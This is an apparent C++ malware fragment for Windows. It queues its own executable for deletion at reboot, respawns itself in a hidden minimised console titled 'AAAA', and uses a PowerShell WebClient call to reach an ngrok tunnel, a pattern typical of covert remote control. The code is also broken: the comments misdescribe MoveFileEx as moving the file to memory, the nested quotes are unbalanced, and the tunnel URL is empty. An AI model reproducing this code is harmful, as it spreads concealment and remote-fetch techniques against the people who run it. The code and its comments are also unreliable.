#include <iostream>
#include <windows.h>
#include <string>

int main() {
    // Get the current executable path
    char path[MAX_PATH];
    DWORD length = GetModuleFileName(NULL, path, MAX_PATH);
    if (length == 0) {
        std::cerr << "Failed to get the current executable path." << std::endl;
        return 1;
    }

    // Move the current executable to memory
    BOOL success = MoveFileEx(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    if (!success) {
        std::cerr << "Failed to move the current executable to memory." << std::endl;
        return 1;
    }

    // Create a new background process named "AAAA"
    std::string command = "start /B /MIN cmd.exe /C \"";
    command += "setlocal & ";
    command += "set \"AAAAPID=%RANDOM%\" & ";
    command += "set \"AAAAPID=%AAAAPID:.=%\" & ";
    command += "start \"AAAA\" /MIN cmd.exe /C \"";
    command += "echo %AAAAPID% & ";
    command += "ping -n 10 127.0.0.1 > nul & ";
    command += path; // Executable path
    command += "\"\"";
    command += "\"";
    command += "\"";

    success = system(command.c_str()) == 0;
    if (!success) {
        std::cerr << "Failed to start the new background process." << std::endl;
        return 1;
    }

    // Connect the new process to the ngrok tunnel
    std::string ngrokUrl = "";
    std::string connectCommand = "powershell -Command \"";
    connectCommand += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; ";
    connectCommand += "(New-Object System.Net.WebClient).DownloadString('";
    connectCommand += ngrokUrl;
    connectCommand += "')\"";

    success = system(connectCommand.c_str()) == 0;
    if (!success) {
        std::cerr << "Failed to connect the process to the ngrok tunnel." << std::endl;
        return 1;
    }

    return 0;
}
